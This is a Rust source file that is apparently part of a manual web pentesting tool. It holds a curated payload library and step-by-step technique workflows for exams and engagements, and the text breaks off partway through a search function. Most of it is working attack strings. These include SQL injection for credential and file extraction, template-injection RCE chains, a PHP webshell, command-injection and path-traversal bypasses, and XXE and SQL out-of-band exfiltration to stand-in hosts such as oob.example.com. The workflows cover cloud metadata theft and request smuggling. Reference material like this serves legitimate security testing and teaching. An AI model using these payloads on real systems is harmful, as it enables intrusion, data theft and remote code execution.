//! Payload library and technique reference for manual web pentesting.
//!
//! Curated, exam- and engagement-relevant payload sets with context on when
//! to reach for them, plus step-by-step technique references. Pure reference
//! data — nothing here touches the network.

use serde::{Deserialize, Serialize};

/// A single payload with its metadata.
#[derive(Clone, Debug, Serialize, Deserialize, PartialEq)]
pub struct Payload {
    /// The raw payload string.
    pub value: String,
    /// What the payload demonstrates or tests.
    pub description: String,
    /// Sub-tag (e.g. "union", "blind", "polyglot").
    #[serde(default)]
    pub tag: String,
    /// Difficulty/impact rating from 1 (trivial) to 5 (expert).
    #[serde(default)]
    pub difficulty: u8,
}

/// A named collection of payloads.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct PayloadSet {
    /// Stable identifier (e.g. "sqli-union").
    pub id: String,
    /// Human title.
    pub title: String,
    /// When to reach for this set.
    pub when_to_use: String,
    /// The payloads.
    pub payloads: Vec<Payload>,
}

/// A technique reference entry: concept, steps, and success indicators.
#[derive(Clone, Debug, Serialize, Deserialize)]
pub struct Technique {
    /// Stable identifier (e.g. "jwt-alg-confusion").
    pub id: String,
    /// Human title.
    pub title: String,
    /// Vulnerability domain (e.g. "Authentication", "Injection").
    pub domain: String,
    /// Short explanation of the underlying concept.
    pub concept: String,
    /// Ordered manual steps to execute the technique.
    pub steps: Vec<String>,
    /// What a successful result looks like.
    pub success_looks_like: String,
    /// Related payload set ids in [`payload_sets`].
    #[serde(default)]
    pub related_payload_sets: Vec<String>,
}

fn p(value: &str, description: &str, tag: &str, difficulty: u8) -> Payload {
    Payload {
        value: value.to_string(),
        description: description.to_string(),
        tag: tag.to_string(),
        difficulty,
    }
}

fn set(id: &str, title: &str, when_to_use: &str, payloads: Vec<Payload>) -> PayloadSet {
    PayloadSet {
        id: id.to_string(),
        title: title.to_string(),
        when_to_use: when_to_use.to_string(),
        payloads,
    }
}

/// Return every payload set in the library.
pub fn payload_sets() -> Vec<PayloadSet> {
    vec![
        set(
            "sqli-union",
            "SQL Injection — UNION-based",
            "The response reflects query output directly and column counts are stable.",
            vec![
                p(
                    "' UNION SELECT NULL-- -",
                    "Probe column count with a single NULL.",
                    "probe",
                    1,
                ),
                p(
                    "' UNION SELECT NULL,NULL-- -",
                    "Add NULLs until the query returns.",
                    "probe",
                    1,
                ),
                p(
                    "' UNION SELECT NULL,NULL,username,password FROM users-- -",
                    "Extract credentials once column count is known.",
                    "exfil",
                    2,
                ),
                p(
                    "' UNION SELECT NULL,table_name FROM information_schema.tables-- -",
                    "Enumerate tables (MySQL/Postgres).",
                    "enum",
                    2,
                ),
                p(
                    "' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'-- -",
                    "Enumerate columns of a target table.",
                    "enum",
                    2,
                ),
                p(
                    "' UNION SELECT NULL,@@version-- -",
                    "Fingerprint database version (MySQL).",
                    "enum",
                    1,
                ),
                p(
                    "' UNION SELECT NULL,sqlite_version()-- -",
                    "Fingerprint SQLite.",
                    "enum",
                    1,
                ),
                p(
                    "' UNION ALL SELECT NULL,NULL,(SELECT group_concat(table_name) FROM sqlite_master)-- -",
                    "SQLite table enumeration via sqlite_master.",
                    "enum",
                    2,
                ),
                p(
                    "' UNION SELECT NULL,pg_read_file('/etc/passwd')-- -",
                    "Postgres file read when superuser.",
                    "exfil",
                    3,
                ),
                p(
                    "' UNION SELECT NULL,LOAD_FILE('/etc/passwd')-- -",
                    "MySQL file read when FILE privilege is granted.",
                    "exfil",
                    3,
                ),
            ],
        ),
        set(
            "sqli-blind",
            "SQL Injection — Blind (boolean & time)",
            "Output is not reflected; infer via behavior differences or response timing.",
            vec![
                p("' AND 1=1-- -", "True condition baseline.", "boolean", 1),
                p(
                    "' AND 1=2-- -",
                    "False condition — compare to baseline.",
                    "boolean",
                    1,
                ),
                p(
                    "' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'-- -",
                    "Character-by-character extraction.",
                    "exfil",
                    3,
                ),
                p(
                    "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -",
                    "Time-based inference (MySQL).",
                    "time",
                    3,
                ),
                p(
                    "'; WAITFOR DELAY '0:0:5'-- -",
                    "Time-based inference (MSSQL).",
                    "time",
                    3,
                ),
                p(
                    "' || (SELECT pg_sleep(5))-- -",
                    "Time-based inference (Postgres).",
                    "time",
                    3,
                ),
                p(
                    "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
                    "Conditional time-based (Postgres).",
                    "time",
                    4,
                ),
                p(
                    "' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64-- -",
                    "Binary-search extraction of table names.",
                    "exfil",
                    4,
                ),
            ],
        ),
        set(
            "sqli-oob",
            "SQL Injection — Out-of-band / stacked",
            "Neither reflection nor timing works, but DNS/HTTP callbacks are possible.",
            vec![
                p(
                    "'; EXEC master..xp_dirtree '\\\\oob.example.com\\share'-- -",
                    "MSSQL OOB via SMB lookup.",
                    "oob",
                    4,
                ),
                p(
                    "'; SELECT utl_http.request('http://oob.example.com/'||user) FROM dual-- -",
                    "Oracle OOB via HTTP request.",
                    "oob",
                    4,
                ),
                p(
                    "'; COPY (SELECT '') TO PROGRAM 'nslookup oob.example.com'-- -",
                    "Postgres command exec leading to OOB.",
                    "oob",
                    5,
                ),
            ],
        ),
        set(
            "xss-reflected",
            "XSS — Reflected context probes",
            "Identify which injection context (HTML body, attribute, JS string) you are in.",
            vec![
                p(
                    "<script>alert(1)</script>",
                    "Classic HTML context probe.",
                    "html",
                    1,
                ),
                p(
                    "\"><script>alert(1)</script>",
                    "Break out of a double-quoted attribute.",
                    "attr",
                    1,
                ),
                p(
                    "'><script>alert(1)</script>",
                    "Single-quote attribute breakout.",
                    "attr",
                    1,
                ),
                p(
                    "</textarea><script>alert(1)</script>",
                    "Escape a textarea/RCDATA context.",
                    "html",
                    2,
                ),
                p(
                    "\"><img src=x onerror=alert(1)>",
                    "Event-handler injection when <script> is filtered.",
                    "event",
                    2,
                ),
                p(
                    "javascript:alert(1)",
                    "Href/src attribute context.",
                    "attr",
                    2,
                ),
                p(
                    "'-alert(1)-'",
                    "Inside a JS string with '-' concatenation.",
                    "js",
                    2,
                ),
                p(
                    "';alert(1)//",
                    "JS string breakout with semicolon.",
                    "js",
                    2,
                ),
                p(
                    "</script><script>alert(1)</script>",
                    "Escape an existing script block.",
                    "js",
                    2,
                ),
                p(
                    "<svg onload=alert(1)>",
                    "SVG-based handler; often survives filters.",
                    "event",
                    2,
                ),
                p(
                    "<details open ontoggle=alert(1)>",
                    "Less-filtered event pair.",
                    "event",
                    3,
                ),
            ],
        ),
        set(
            "xss-polyglot",
            "XSS — Polyglots and filter bypass",
            "Filters strip common tags; one payload, many contexts.",
            vec![
                p(
                    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
                    "Multi-context polyglot.",
                    "polyglot",
                    5,
                ),
                p(
                    "'><svg/onload=alert(1)>",
                    "Attribute breakout into SVG.",
                    "attr",
                    2,
                ),
                p(
                    "<script>\\u0061lert(1)</script>",
                    "Unicode-escaped keyword.",
                    "encoding",
                    3,
                ),
                p(
                    "<scri<script>pt>alert(1)</script>",
                    "Nested tag re-assembly after stripping.",
                    "split",
                    3,
                ),
                p(
                    "%253Cscript%253Ealert(1)%253C/script%253E",
                    "Double URL-encoding.",
                    "encoding",
                    3,
                ),
            ],
        ),
        set(
            "ssti",
            "SSTI — Engine detection & exploitation",
            "User input lands inside a rendered template; fingerprint the engine first.",
            vec![
                p("{{7*7}}", "Jinja2/Twig probe — expect 49.", "probe", 1),
                p("${7*7}", "Freemarker/Velocity/EL probe.", "probe", 1),
                p("<%= 7*7 %>", "ERB probe.", "probe", 1),
                p("#{7*7}", "Ruby/Spring EL probe.", "probe", 1),
                p(
                    "{{7*'7'}}",
                    "Jinja2 returns 49, Twig returns 7777777 — discriminator.",
                    "probe",
                    2,
                ),
                p("${{7*7}}", "Catches double-brace wrappers.", "probe", 2),
                p("{{config}}", "Jinja2 config disclosure.", "enum", 2),
                p(
                    "{{''.__class__.__mro__[1].__subclasses__()}}",
                    "Jinja2 subclass enumeration.",
                    "enum",
                    3,
                ),
                p(
                    "{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}",
                    "Jinja2 RCE via subprocess (index varies).",
                    "rce",
                    5,
                ),
                p("<%= system('id') %>", "ERB RCE.", "rce", 4),
                p(
                    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
                    "Freemarker RCE via Execute class.",
                    "rce",
                    4,
                ),
                p(
                    "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}",
                    "Jinja2 RCE via globals chain.",
                    "rce",
                    5,
                ),
            ],
        ),
        set(
            "ssrf",
            "SSRF — Internal network & cloud metadata",
            "The server fetches a user-supplied URL; pivot to internal services.",
            vec![
                p(
                    "http://127.0.0.1:8080/",
                    "Local service probe.",
                    "internal",
                    1,
                ),
                p(
                    "http://localhost/admin",
                    "Local admin interface.",
                    "internal",
                    1,
                ),
                p(
                    "http://169.254.169.254/latest/meta-data/",
                    "AWS instance metadata (IMDSv1).",
                    "cloud",
                    3,
                ),
                p(
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "GCP metadata (needs header).",
                    "cloud",
                    3,
                ),
                p(
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                    "Azure metadata.",
                    "cloud",
                    3,
                ),
                p("file:///etc/passwd", "Local file scheme abuse.", "file", 2),
                p(
                    "gopher://127.0.0.1:6379/_INFO",
                    "Gopher to internal Redis.",
                    "gopher",
                    4,
                ),
                p(
                    "http://0.0.0.0:8080/",
                    "Zero-address bypass of naive filters.",
                    "bypass",
                    2,
                ),
                p("http://[::1]:8080/", "IPv6 loopback bypass.", "bypass", 2),
                p(
                    "http://0x7f000001:8080/",
                    "Hex-encoded IP bypass.",
                    "bypass",
                    3,
                ),
                p("http://2130706433:8080/", "Decimal IP bypass.", "bypass", 3),
                p(
                    "http://internal.example.com@attacker.example.com/",
                    "URL authority confusion.",
                    "bypass",
                    3,
                ),
            ],
        ),
        set(
            "cmd-injection",
            "Command Injection — Operators & blind techniques",
            "User input reaches a shell command; start with safe, reversible operators.",
            vec![
                p(";id", "Semicolon chaining.", "operator", 1),
                p("|id", "Pipe chaining.", "operator", 1),
                p("&&id", "AND chaining.", "operator", 1),
                p("||id", "OR chaining.", "operator", 1),
                p("`id`", "Backtick substitution.", "operator", 2),
                p("$(id)", "Command substitution.", "operator", 2),
                p("%0aid", "Newline separator.", "operator", 2),
                p("& id &", "Windows CMD chaining.", "operator", 2),
                p(
                    "$(cat${IFS}/etc/passwd)",
                    "IFS bypass for space filtering.",
                    "bypass",
                    3,
                ),
                p(
                    "cat</etc/passwd",
                    "Input redirection instead of space.",
                    "bypass",
                    3,
                ),
                p("{cat,/etc/passwd}", "Brace expansion.", "bypass", 3),
                p("c'a't /etc/passwd", "Quote-insertion bypass.", "bypass", 3),
                p("sleep 5", "Blind time-based confirmation.", "blind", 2),
                p(
                    "| ping -c 5 127.0.0.1",
                    "Blind confirmation via latency.",
                    "blind",
                    2,
                ),
            ],
        ),
        set(
            "path-traversal",
            "Path Traversal — Encoding & bypass",
            "File paths are user-controlled; escalate from read to RCE via log poisoning.",
            vec![
                p("../../../etc/passwd", "Basic Unix traversal.", "basic", 1),
                p(
                    "..\\..\\..\\windows\\win.ini",
                    "Basic Windows traversal.",
                    "basic",
                    1,
                ),
                p(
                    "/etc/passwd",
                    "Absolute path (no traversal needed).",
                    "basic",
                    1,
                ),
                p(
                    "....//....//....//etc/passwd",
                    "Filter strips '../' once.",
                    "bypass",
                    2,
                ),
                p(
                    "..%2f..%2f..%2fetc%2fpasswd",
                    "URL-encoded slashes.",
                    "encoding",
                    2,
                ),
                p(
                    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "Fully URL-encoded.",
                    "encoding",
                    2,
                ),
                p(
                    "..%252f..%252fetc%252fpasswd",
                    "Double URL-encoding.",
                    "encoding",
                    3,
                ),
                p(
                    "/proc/self/environ",
                    "Environment disclosure via procfs.",
                    "enum",
                    3,
                ),
                p(
                    "/proc/self/cmdline",
                    "Running command disclosure.",
                    "enum",
                    3,
                ),
                p(
                    "/var/log/apache2/access.log",
                    "Log-poisoning target for LFI-to-RCE.",
                    "rce",
                    4,
                ),
                p(
                    "php://filter/convert.base64-encode/resource=index.php",
                    "PHP wrapper source disclosure.",
                    "wrapper",
                    3,
                ),
                p(
                    "php://input",
                    "PHP wrapper for body-as-code (requires include).",
                    "wrapper",
                    4,
                ),
                p(
                    "data://text/plain,<?php system('id');?>",
                    "data wrapper RCE (requires include).",
                    "wrapper",
                    4,
                ),
            ],
        ),
        set(
            "xxe",
            "XXE — File read, SSRF, and blind exfil",
            "XML input is parsed; internal DTD subsets are the classic vector.",
            vec![
                p(
                    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><r>&x;</r>",
                    "Classic file-read entity.",
                    "file",
                    2,
                ),
                p(
                    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'php://filter/convert.base64-encode/resource=/etc/passwd'>]><r>&x;</r>",
                    "PHP wrapper base64 read.",
                    "file",
                    3,
                ),
                p(
                    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM 'http://169.254.169.254/latest/meta-data/'>]><r>&x;</r>",
                    "XXE-to-SSRF cloud metadata.",
                    "ssrf",
                    3,
                ),
                p(
                    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % d SYSTEM 'http://oob.example.com/evil.dtd'>%d;]><r/>",
                    "External DTD for OOB exfil.",
                    "oob",
                    4,
                ),
                p(
                    "<!ENTITY % f SYSTEM 'file:///etc/passwd'><!ENTITY % s '<!ENTITY % e SYSTEM \"http://oob.example.com/?d=%f;\">'>%s;%e;",
                    "Parameter-entity exfil chain (hosted in evil.dtd).",
                    "oob",
                    5,
                ),
            ],
        ),
        set(
            "nosqli",
            "NoSQL Injection — Mongo operators & JSON",
            "The backend is MongoDB or accepts JSON bodies into queries.",
            vec![
                p(
                    "admin' || '1'=='1",
                    "NoSQL operator injection in string context.",
                    "operator",
                    2,
                ),
                p(
                    "admin'||''||'",
                    "Concatenation-based truthiness.",
                    "operator",
                    2,
                ),
                p(
                    "{\"$ne\": null}",
                    "Not-equal operator in JSON body.",
                    "operator",
                    2,
                ),
                p(
                    "{\"$gt\": \"\"}",
                    "Greater-than empty-string bypass.",
                    "operator",
                    2,
                ),
                p(
                    "{\"$regex\": \".*\"}",
                    "Regex match-everything bypass.",
                    "operator",
                    2,
                ),
                p(
                    "{\"$where\": \"sleep(5000)\"}",
                    "Blind via JS where-clause timing.",
                    "blind",
                    4,
                ),
                p(
                    "username[$ne]=admin&password[$gt]= ",
                    "Query-string operator arrays (PHP-style).",
                    "param",
                    3,
                ),
                p(
                    "{\"$or\":[{}, {\"a\":\"a\"}]}",
                    "OR-true bypass.",
                    "operator",
                    3,
                ),
            ],
        ),
        set(
            "jwt",
            "JWT — Algorithm confusion & forgery",
            "Tokens gate authorization; test alg handling and key strength.",
            vec![
                p(
                    "alg: none",
                    "Set alg to none with empty signature.",
                    "alg-none",
                    2,
                ),
                p(
                    "alg: HS256 with leaked public key",
                    "RS256 to HS256 confusion; sign with the public key.",
                    "confusion",
                    4,
                ),
                p(
                    "kid: ../../dev/null",
                    "kid path traversal to a known key file.",
                    "kid",
                    3,
                ),
                p(
                    "kid: key' UNION SELECT 'secret",
                    "kid SQLi to control the signing secret.",
                    "kid-sqli",
                    4,
                ),
                p(
                    "jku: http://attacker.example.com/jwks.json",
                    "jku header pointing to attacker JWKS.",
                    "jku",
                    4,
                ),
                p(
                    "jwk: {embedded attacker key}",
                    "Embedded JWK header signing key.",
                    "jwk",
                    4,
                ),
                p(
                    "exp: 9999999999",
                    "Expired-token acceptance check.",
                    "claims",
                    1,
                ),
            ],
        ),
        set(
            "auth-bypass",
            "Authentication & Session — Login bypass patterns",
            "Classic login-form attacks before reaching for SQLi tooling.",
            vec![
                p("admin'-- -", "Comment out password check.", "sqli", 2),
                p("admin' OR '1'='1'-- -", "Tautology bypass.", "sqli", 1),
                p("admin\"-- -", "Double-quote context bypass.", "sqli", 2),
                p("{\"$regex\":\"admin.*\"}", "Mongo regex login.", "nosql", 3),
                p(
                    "{\"$ne\":null,\"$gt\":\"\"}",
                    "Mongo operator login bypass.",
                    "nosql",
                    3,
                ),
            ],
        ),
        set(
            "file-upload",
            "File Upload — Webshell & content-type tricks",
            "Uploads land on the server; test extension and content-type enforcement.",
            vec![
                p("shell.php.jpg", "Double extension.", "ext", 2),
                p("shell.pHp", "Case-variation extension.", "ext", 1),
                p(
                    "shell.php%00.jpg",
                    "Null-byte truncation (legacy PHP).",
                    "ext",
                    3,
                ),
                p(
                    ".htaccess: AddType application/x-httpd-php .jpg",
                    "htaccess upload to re-map handlers.",
                    "config",
                    4,
                ),
                p(
                    "GIF89a; <?php system($_GET['c']); ?>",
                    "Magic-byte prefix PHP shell.",
                    "polyglot",
                    3,
                ),
            ],
        ),
        set(
            "deserialization",
            "Insecure Deserialization — Gadget probes",
            "Serialized objects cross the boundary; fingerprint the format first.",
            vec![
                p(
                    "O:8:\"Standard\":1:{s:3:\"key\";s:5:\"value\";}",
                    "PHP object serialization probe.",
                    "php",
                    3,
                ),
                p(
                    "rO0ABXNyAB...",
                    "Java serialized-object magic (aced 0005 in hex).",
                    "java",
                    4,
                ),
                p(
                    "ysoserial CommonsCollections1 'id'",
                    "Java gadget chain invocation.",
                    "java",
                    5,
                ),
                p(
                    "pickle __reduce__ gadget",
                    "Python pickle RCE gadget.",
                    "python",
                    4,
                ),
                p(
                    "Marshal.load with Ruby gadget",
                    "Ruby marshal gadget.",
                    "ruby",
                    5,
                ),
            ],
        ),
        set(
            "idor",
            "IDOR & Access Control — Enumeration patterns",
            "Object identifiers are sequential or guessable; test horizontal access.",
            vec![
                p("/api/users/1", "Sequential ID probe.", "seq", 1),
                p("/api/users/1001", "Offset ID probe.", "seq", 1),
                p(
                    "/api/users/uuid-of-other-user",
                    "Swap a known foreign UUID.",
                    "uuid",
                    2,
                ),
                p("?user_id=2&admin=true", "Parameter tampering.", "param", 2),
                p(
                    "X-Original-URL: /admin",
                    "Header-based routing bypass.",
                    "header",
                    3,
                ),
                p(
                    "X-Rewrite-URL: /admin",
                    "Alternate rewrite header.",
                    "header",
                    3,
                ),
            ],
        ),
        set(
            "smuggling",
            "HTTP Request Smuggling — CL/TE desync",
            "A front-end proxy disagrees with the back-end on request boundaries.",
            vec![
                p(
                    "Content-Length: 4\r\nTransfer-Encoding: chunked",
                    "CL.TE probe basis.",
                    "clte",
                    4,
                ),
                p(
                    "Transfer-Encoding: chunked\r\nContent-Length: 4",
                    "TE.CL probe basis.",
                    "tecl",
                    4,
                ),
                p(
                    "Transfer-Encoding: xchunked",
                    "Obfuscation variant.",
                    "obfuscation",
                    4,
                ),
                p(
                    "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
                    "Duplicate TE header desync.",
                    "obfuscation",
                    4,
                ),
            ],
        ),
        set(
            "graphql",
            "GraphQL — Introspection & abuse",
            "A GraphQL endpoint exists; map the schema, then abuse resolvers.",
            vec![
                p(
                    "{__schema{types{name}}}",
                    "Basic introspection query.",
                    "introspection",
                    1,
                ),
                p(
                    "{__schema{queryType{name}}}",
                    "Root type disclosure.",
                    "introspection",
                    1,
                ),
                p(
                    "[{\"query\":\"...\"},{\"query\":\"...\"}]",
                    "Batched-query array for brute force.",
                    "batching",
                    3,
                ),
                p(
                    "{\"query\":\"mutation {deleteUser(id:1){ok}}\"}",
                    "Unauthorized mutation test.",
                    "mutation",
                    2,
                ),
                p(
                    "query q @skip(if:true) {__typename}",
                    "Directive abuse probe.",
                    "directive",
                    3,
                ),
            ],
        ),
        set(
            "waf-bypass",
            "WAF Bypass — Encoding & syntax tricks",
            "A WAF blocks the straightforward payload; change syntax, not intent.",
            vec![
                p(
                    "%3cscript%3ealert(1)%3c/script%3e",
                    "Full URL-encoding.",
                    "encoding",
                    2,
                ),
                p(
                    "\\x3cscript\\x3e",
                    "Hex escapes in JS context.",
                    "encoding",
                    3,
                ),
                p("SeLeCt", "Mixed case for keyword filters.", "case", 2),
                p("SEL/**/ECT", "Inline comment split.", "split", 2),
                p(
                    "UNION ALL SELECT",
                    "UNION ALL instead of UNION.",
                    "syntax",
                    2,
                ),
                p(
                    "null`null`null",
                    "Backtick separation (MySQL).",
                    "syntax",
                    3,
                ),
            ],
        ),
        set(
            "crypto",
            "Crypto & Hash — Length extension & oracles",
            "A token is hash(secret||data) with a known structure, or CBC padding leaks.",
            vec![
                p(
                    "hash_extender --data 'user=guest' --append 'admin' --secret-len 32",
                    "Length-extension attack invocation.",
                    "extension",
                    4,
                ),
                p(
                    "padding_oracle --url ... --block 16",
                    "CBC padding oracle automation.",
                    "oracle",
                    4,
                ),
                p(
                    "ECB block swap: ciphertext[16:32] ciphertext[0:16]",
                    "ECB block rearrangement.",
                    "ecb",
                    3,
                ),
            ],
        ),
    ]
}

/// Look up one payload set by id.
pub fn payload_set(id: &str) -> Option<PayloadSet> {
    payload_sets().into_iter().find(|s| s.id == id)
}

/// Return every technique in the reference.
pub fn techniques() -> Vec<Technique> {
    vec![
        Technique {
            id: "sqli-union-workflow".into(),
            title: "UNION-based SQLi workflow".into(),
            domain: "Injection".into(),
            concept: "Extend the original query with extra columns you control, so the \
                      response carries data from other tables."
                .into(),
            steps: vec![
                "Find a parameter reflected in the response (sort, filter, id).".into(),
                "Determine the column count with ORDER BY N until it errors.".into(),
                "Confirm with UNION SELECT NULL,... until the query returns.".into(),
                "Find which columns are echoed back to the page.".into(),
                "Enumerate information_schema (or sqlite_master) for tables.".into(),
                "Extract target data from the interesting columns.".into(),
            ],
            success_looks_like: "Foreign data rendered in the response on top of the original row."
                .into(),
            related_payload_sets: vec!["sqli-union".into()],
        },
        Technique {
            id: "sqli-blind-workflow".into(),
            title: "Blind SQLi (boolean & time)".into(),
            domain: "Injection".into(),
            concept: "When data is not reflected, ask yes/no questions through observable \
                      behavior: response differences (boolean) or response latency (time)."
                .into(),
            steps: vec![
                "Establish a true baseline (' AND 1=1) and a false baseline (' AND 1=2).".into(),
                "Compare status codes, body length, or content deltas.".into(),
                "If identical, add SLEEP/pg_sleep/WAITFOR and measure timing.".into(),
                "Automate extraction with binary search per character.".into(),
            ],
            success_looks_like: "Predictable behavior difference driven purely by your condition."
                .into(),
            related_payload_sets: vec!["sqli-blind".into(), "sqli-oob".into()],
        },
        Technique {
            id: "xss-context-breakout".into(),
            title: "XSS context identification & breakout".into(),
            domain: "Injection".into(),
            concept: "Payload success depends entirely on the surrounding context: HTML body, \
                      attribute value, JS string, or RCDATA element. Identify first, craft second."
                .into(),
            steps: vec![
                "Inject a unique marker (e.g. xqz123\">'<) into every parameter.".into(),
                "Inspect the reflected markup to find where your characters landed.".into(),
                "Match the context: body -> <script>/event handlers; attribute -> quote breakout; \
                  JS string -> terminate the string."
                    .into(),
                "Check which characters/keywords get filtered or encoded.".into(),
                "Craft a minimal payload for that context; escalate to polyglots if filtered."
                    .into(),
            ],
            success_looks_like:
                "Script execution in the browser (or alert console in headless labs).".into(),
            related_payload_sets: vec!["xss-reflected".into(), "xss-polyglot".into()],
        },
        Technique {
            id: "ssti-detection-chain".into(),
            title: "SSTI detection and engine chain".into(),
            domain: "Injection".into(),
            concept: "Template engines evaluate expressions inside placeholders; each engine \
                      has a distinct arithmetic fingerprint and escalation path."
                .into(),
            steps: vec![
                "Inject {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7} and watch for 49.".into(),
                "Discriminate engines with {{7*'7'}} (Jinja2=49, Twig=7777777).".into(),
                "Read config/globals for enum ({{config}}).".into(),
                "Escalate along the engine's gadget chain to RCE.".into(),
            ],
            success_looks_like: "Arithmetic result reflected verbatim, then command output.".into(),
            related_payload_sets: vec!["ssti".into()],
        },
        Technique {
            id: "ssrf-pivot".into(),
            title: "SSRF discovery and internal pivot".into(),
            domain: "Request Forgery".into(),
            concept: "A server-side fetch of attacker-controlled URLs can reach services that \
                      trust the host: admin panels, metadata services, internal APIs."
                .into(),
            steps: vec![
                "Find URL-fetching features: importers, previewers, webhooks, PDF generators."
                    .into(),
                "Point them at a callback server you control to confirm egress.".into(),
                "Probe loopback and internal ranges for live services.".into(),
                "Hit cloud metadata (169.254.169.254) for credentials.".into(),
                "If filters block IPs, bypass with hex/decimal/IPv6/DNS-rebinding encodings."
                    .into(),
            ],
            success_looks_like: "Callback hit, internal-only response content, or metadata JSON."
                .into(),
            related_payload_sets: vec!["ssrf".into()],
        },
        Technique {
            id: "jwt-forgery".into(),
            title: "JWT forgery and algorithm confusion".into(),
            domain: "Authentication".into(),
            concept: "The header selects the algorithm; if the server trusts it blindly, you \
                      can pick 'none', flip RS256 to HS256, or inject a key via jku/jwk/kid."
                .into(),
            steps: vec![
                "Decode the token; note alg, kid, jku, and claims.".into(),
                "Try alg:none with an empty signature.".into(),
                "If RS256, test HS256 confusion using the public key as the HMAC secret.".into(),
                "Test weak HMAC secrets with a wordlist.".into(),
                "Probe kid/jku/jwk header injection for key control.".into(),
                "Tamper claims (role, exp) and observe acceptance.".into(),
            ],
            success_looks_like: "A self-signed token accepted with escalated claims.".into(),
            related_payload_sets: vec!["jwt".into()],
        },
        Technique {
            id: "lfi-to-rce".into(),
            title: "Path traversal to RCE (log poisoning)".into(),
            domain: "Injection".into(),
            concept: "File-read primitives become code execution when you can write attacker \
                      bytes into a file the server later executes or includes."
                .into(),
            steps: vec![
                "Establish read primitive with ../etc/passwd variants.".into(),
                "Bypass filters with encoding and stripping-resistance tricks.".into(),
                "Read /proc/self/environ and web server config for layout.".into(),
                "Inject PHP into a log you can read back (access log / User-Agent).".into(),
                "Include the poisoned file to trigger execution.".into(),
            ],
            success_looks_like: "Command output rendered from the included file.".into(),
            related_payload_sets: vec!["path-traversal".into()],
        },
        Technique {
            id: "desync-smuggling".into(),
            title: "HTTP request smuggling (CL/TE desync)".into(),
            domain: "Request Smuggling".into(),
            concept: "Front-end and back-end disagree about where one request ends, so your \
                      smuggled prefix poisons the next user's request."
                .into(),
            steps: vec![
                "Send CL.TE and TE.CL probes with timing-safe bodies.".into(),
                "Detect the desync via differential responses or timeouts.".into(),
                "Confirm with a harmless smuggled prefix (e.g. a GET to /404).".into(),
                "Escalate: capture other users' requests via a stored reflection.".into(),
            ],
            success_looks_like: "Intermittent wrong responses or captured victim traffic.".into(),
            related_payload_sets: vec!["smuggling".into()],
        },
        Technique {
            id: "access-control-testing".into(),
            title: "Access control & IDOR methodology".into(),
            domain: "Access Control".into(),
            concept: "Authorization bugs appear where object identity is user-controlled; \
                      test horizontally (other users) and vertically (admin functions)."
                .into(),
            steps: vec![
                "Create two accounts; map every object ID and endpoint.".into(),
                "Swap IDs/UUIDs across accounts; compare responses.".into(),
                "Test method overrides (X-HTTP-Method-Override) and header routing \
                  (X-Original-URL)."
                    .into(),
                "Try privileged actions as a low-privilege user.".into(),
                "Check for missing authorization on API verbs (PUT/DELETE).".into(),
            ],
            success_looks_like: "Data or actions from another user/principal returned or executed."
                .into(),
            related_payload_sets: vec!["idor".into()],
        },
        Technique {
            id: "nosql-operators".into(),
            title: "NoSQL operator injection".into(),
            domain: "Injection".into(),
            concept: "MongoDB accepts query operators as values; if JSON/query-string \
                      operators reach the driver, you replace equality with $ne/$gt/$regex."
                .into(),
            steps: vec![
                "Send JSON bodies with {\"$ne\": null} on auth fields.".into(),
                "Try bracket notation in query strings (param[$ne]).".into(),
                "Use $regex to extract data character by character.".into(),
                "Time-based confirmation via $where if blind.".into(),
            ],
            success_looks_like: "Authentication bypass or data extraction without valid creds."
                .into(),
            related_payload_sets: vec!["nosqli".into(), "auth-bypass".into()],
        },
        Technique {
            id: "graphql-abuse".into(),
            title: "GraphQL enumeration and abuse".into(),
            domain: "API".into(),
            concept: "Introspection maps the schema; batching and aliases enable brute force \
                      and rate-limit evasion; mutations may lack authorization."
                .into(),
            steps: vec![
                "Locate the endpoint (/graphql, /api/graphql, alt methods).".into(),
                "Run introspection; if blocked, use field suggestion errors.".into(),
                "Test batched queries and alias flooding for brute force.".into(),
                "Attempt unauthorized mutations and cross-field access.".into(),
            ],
            success_looks_like: "Schema disclosure, brute-force success, or unauthorized mutation."
                .into(),
            related_payload_sets: vec!["graphql".into()],
        },
        Technique {
            id: "waf-evasion".into(),
            title: "WAF evasion methodology".into(),
            domain: "Evasion".into(),
            concept: "WAFs match signatures; equivalent syntax with different bytes or \
                      structure often passes. Change syntax, not intent."
                .into(),
            steps: vec![
                "Fingerprint the WAF and trigger its block page.".into(),
                "Test case, comments, encoding layers, and verb tampering.".into(),
                "Re-assemble blocked keywords with nested tags or comment splits.".into(),
                "Escape the parameter entirely (path, header, JSON body).".into(),
            ],
            success_looks_like: "Original payload intent delivered despite the block page.".into(),
            related_payload_sets: vec!["waf-bypass".into()],
        },
    ]
}

/// Look up one technique by id.
pub fn technique(id: &str) -> Option<Technique> {
    techniques().into_iter().find(|t| t.id == id)
}

/// Distinct technique domains, in library order.
pub fn technique_domains() -> Vec<String> {
    let mut domains: Vec<String> = Vec::new();
    for t in techniques() {
        if !domains.contains(&t.domain) {
            domains.push(t.domain);
        }
    }
    domains
}

/// Case-insensitive substring search across payload sets and techniques.
pub fn search(query: &str) -> SearchResult {
    let q = query.to_lowercase();
